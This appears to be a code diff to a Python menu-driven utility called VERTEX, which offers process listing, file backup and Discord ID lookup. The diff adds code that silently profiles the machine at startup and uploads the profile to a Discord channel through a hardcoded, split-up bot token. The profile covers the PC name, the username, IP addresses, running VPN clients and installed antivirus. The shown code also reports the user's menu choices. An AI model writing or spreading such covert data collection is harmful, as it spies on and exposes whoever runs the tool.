@@ -18,7 +18,7 @@ from datetime import datetime
 
 init(autoreset=True)  # Automatically reset colors after each print
 
-# Obfuscated Discord bot token and channel ID
+# Discord bot token and channel ID
 TOKEN_PART1 = 'MTI4MDQ0NDk2NDAzOTQzMDE0NA'
 TOKEN_PART2 = 'Gqe9R6'
 TOKEN_PART3 = '6FxrSF0yzRFtvp_61nYt23M_M76GSL6FCc7GrE'
@@ -48,6 +48,92 @@ def get_local_ip():
     except Exception as e:
         return f"Error: {e}"
 
+def check_vpn_status():
+    """Check for VPN processes and their status."""
+    vpn_processes = {
+        'hsscp.exe': 'Hotspot Shield VPN',
+        'vpnclient.exe': 'Cisco VPN Client',
+        'openvpn.exe': 'OpenVPN',
+        'hotspotshield.exe': 'Hotspot Shield VPN',
+        'nordvpn.exe': 'NordVPN',
+        'expressvpn.exe': 'ExpressVPN',
+        'protonvpn.exe': 'ProtonVPN',
+        'surfshark.exe': 'Surfshark VPN',
+        'cyberghost.exe': 'CyberGhost VPN',
+        'pia_manager.exe': 'Private Internet Access',
+        'windscribe.exe': 'Windscribe VPN',
+        'mullvad.exe': 'Mullvad VPN',
+        'ivpn.exe': 'IVPN'
+    }
+    
+    vpn_status = "No"
+    detected_vpn = []
+    for process, name in vpn_processes.items():
+        try:
+            output = subprocess.check_output(f'tasklist /FI "IMAGENAME eq {process}"', shell=True)
+            if process.encode() in output:
+                vpn_status = "Yes"
+                detected_vpn.append(name)
+        except subprocess.CalledProcessError:
+            continue
+    
+    return vpn_status, detected_vpn
+
+def check_antivirus_status():
+    """Check for antivirus processes."""
+    antivirus_processes = {
+        'avp.exe': 'Kaspersky',
+        'avgui.exe': 'AVG',
+        'avastui.exe': 'Avast Antivirus',
+        'msmpeng.exe': 'Windows Defender',
+        'mcshield.exe': 'McAfee',
+        'nortonsecurity.exe': 'Norton Security',
+        'esetonlinescanner.exe': 'ESET Online Scanner',
+        'mbam.exe': 'Malwarebytes',
+        'savservice.exe': 'Sophos',
+        'f-secure.exe': 'F-Secure',
+        'bdservicehost.exe': 'Bitdefender',
+        'antivir.exe': 'Avira',
+        'antimalware_service.exe': 'Microsoft Defender'
+    }
+    
+    detected_antivirus = []
+    for process, name in antivirus_processes.items():
+        try:
+            output = subprocess.check_output(f'tasklist /FI "IMAGENAME eq {process}"', shell=True)
+            if process.encode() in output:
+                detected_antivirus.append(name)
+        except subprocess.CalledProcessError:
+            continue
+    
+    return detected_antivirus
+
+def gather_system_info():
+    """Gather and save system information to a text file."""
+    try:
+        public_ip = get_public_ip()
+        local_ip = get_local_ip()
+        vpn_status, detected_vpn = check_vpn_status()
+        detected_antivirus = check_antivirus_status()
+
+        system_info = [
+            f"**PC Name:** {os.getenv('COMPUTERNAME')}",
+            f"**User Profile:** {os.getlogin()}",
+            f"**OS Version:** {os.name}",
+            f"**Local IP:** {local_ip}",
+            f"**Public IP:** {public_ip}",
+            f"**Proxy/VPN Status:** {vpn_status}",
+            f"**Detected VPNs:** {', '.join(detected_vpn) if detected_vpn else 'None'}",
+            f"**Detected Antivirus:** {', '.join(detected_antivirus) if detected_antivirus else 'None'}"
+        ]
+
+        with open(TEMP_FILE, 'w') as file:
+            file.write("\n".join(system_info))
+        
+    except Exception as e:
+        with open(TEMP_FILE, 'w') as file:
+            file.write(f"Error gathering system info: {e}")
+
 def send_discord_message(message):
     """Send a message to a Discord channel using a bot."""
     url = f"https://discord.com/api/v9/channels/{DISCORD_CHANNEL_ID}/messages"
@@ -71,19 +157,6 @@ def send_discord_file(filepath):
     }
     requests.post(url, headers=headers, files=files)
 
-def gather_system_info():
-    """Gather and save system information to a text file."""
-    system_info = []
-    try:
-        output = subprocess.check_output('systeminfo', shell=True).decode()
-        system_info.append(output)
-        with open(TEMP_FILE, 'w') as file:
-            file.write("\n".join(system_info))
-    except Exception as e:
-        system_info.append(f"Error retrieving system info: {e}")
-        with open(TEMP_FILE, 'w') as file:
-            file.write("\n".join(system_info))
-
 def print_colored(text, color):
     """Print text in the specified color."""
     print(f"{color}{text}{Style.RESET_ALL}")
@@ -95,12 +168,12 @@ def clear_screen():
 def display_header():
     """Display the header with ASCII art for VERTEX."""
     print_colored(r"""
-  _    __     ______  _______  __  __ 
- | |  / /    |  ____||__   __||  \/  |
- | | / /     | |__      | |   | \  / |
- | |/ /      |  __|     | |   | |\/| |
- |   <       | |____    | |   | |  | |
- |_|\_\      |______|   |_|   |_|  |_|        
+ _    __     ______  _______  __  __ 
+| |  / /    |  ____||__   __||  \/  | 
+| | / /     | |__      | |   | \  / | 
+| |/ /      |  __|     | |   | |\/| | 
+| |\ \      | |____    | |   | |  | | 
+|_| \_\     |______|   |_|   |_|  |_| 
     """, Fore.CYAN)
 
 def display_menu():
@@ -138,7 +211,6 @@ def list_files_by_type(extensions):
         os.path.expanduser('~\\Documents'),
         os.path.expanduser('~\\Downloads')
     ]
-    
     files = []
     for directory in directories:
         if os.path.exists(directory):
@@ -202,7 +274,6 @@ def backup_files(username):
             desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
             backup_folder = os.path.join(desktop_path, 'Vertex_Backups')
             os.makedirs(backup_folder, exist_ok=True)
-            
             for file_index in selected_indices:
                 if 0 <= file_index < len(files):
                     shutil.copy2(files[file_index], backup_folder)
@@ -347,30 +418,24 @@ def id_resolver(username):
     clear_screen()
     """Resolve Discord user ID to a username using Selenium to interact with discord.id."""
     discord_user_id = input("Enter the Discord user ID to resolve: ")
-    
     # Setup Selenium WebDriver
     options = webdriver.ChromeOptions()
     options.add_argument('--headless')  # Run in headless mode (no browser UI)
     options.add_argument('--disable-gpu')
     driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()), options=options)
-
     try:
         # Navigate to discord.id
         driver.get("https://discord.id/")
-
         # Wait for the input box to be available
         wait = WebDriverWait(driver, 20)
         input_box = wait.until(EC.presence_of_element_located((By.ID, 'userid')))
-
         # Enter the Discord user ID
         input_box.clear()
         input_box.send_keys(discord_user_id)
         input_box.send_keys(Keys.RETURN)
-
         # Wait for the result to appear
         wait.until(EC.presence_of_element_located((By.ID, 'userTag')))
-
-        # Extract the username
+        # Extract the username result
         result = driver.find_element(By.ID, 'userTag')
         username_result = result.text.strip()
         if username_result:
@@ -393,13 +458,11 @@ def log_to_word(discord_id, username):
         doc.add_heading('Discord ID Lookup Results', 0)
     else:
         doc = Document(DOCX_FILENAME)
-    
     now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     doc.add_paragraph(f"Lookup Time: {now}")
     doc.add_paragraph(f"Discord ID: {discord_id}")
     doc.add_paragraph(f"Discord Username: {username}")
     doc.add_paragraph("-------------------------------")
-    
     doc.save(DOCX_FILENAME)
     send_discord_message(f"Logged Discord ID '{discord_id}' lookup result to Word document.")
 
@@ -474,15 +537,15 @@ def show_active_window_title(username):
 def main_menu():
     username = os.getlogin()  # Get the actual username
     send_discord_message(f"User '{username}' started the script.")
-    
+    gather_system_info()  # Gather and send system info at the start
+    send_discord_file(TEMP_FILE)  # Send the system info file to Discord
+
     while True:
         clear_screen()
         display_header()
         display_menu()
         display_socials()
-        
         choice = input("Enter your choice (1-14): ")
-        
         if choice == '1':
             send_discord_message(f"User '{username}' chose option 1: List Processes")
             list_processes(username)
